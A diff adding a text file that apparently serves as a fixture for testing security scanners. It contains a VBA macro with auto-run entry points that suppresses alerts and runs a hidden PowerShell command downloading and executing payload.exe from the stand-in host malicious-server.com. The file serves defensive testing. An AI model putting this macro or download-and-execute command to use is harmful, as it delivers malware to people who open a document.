@@ -1,0 +1,41 @@
+DOCUMENT WITH SIMULATED MACRO
+============================
+
+This is a text file that simulates a document with a malicious macro.
+In a real scenario, this would be a .docx or .xlsx file with an embedded macro.
+
+The following is a representation of what a malicious macro might look like:
+
+```vba
+Sub AutoOpen()
+    ' This macro runs automatically when the document is opened
+    ' MALICIOUS MACRO SIMULATION - This is not actual code
+    On Error Resume Next
+    
+    ' Disable security warnings
+    Application.DisplayAlerts = False
+    
+    ' Download and execute payload
+    Dim payload As String
+    payload = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""&{Invoke-WebRequest -Uri 'http://malicious-server.com/payload.exe' -OutFile '$env:TEMP\payload.exe'; Start-Process '$env:TEMP\payload.exe'}"""
+    
+    ' Execute the payload
+    Shell payload, vbHide
+    
+    ' Re-enable security warnings
+    Application.DisplayAlerts = True
+End Sub
+
+Sub Document_Open()
+    ' Alternative entry point
+    AutoOpen
+End Sub
+
+Sub AutoExec()
+    ' Another alternative entry point
+    AutoOpen
+End Sub
+```
+
+This file is for testing security scanning tools only.
+No actual malicious code is present or executed.
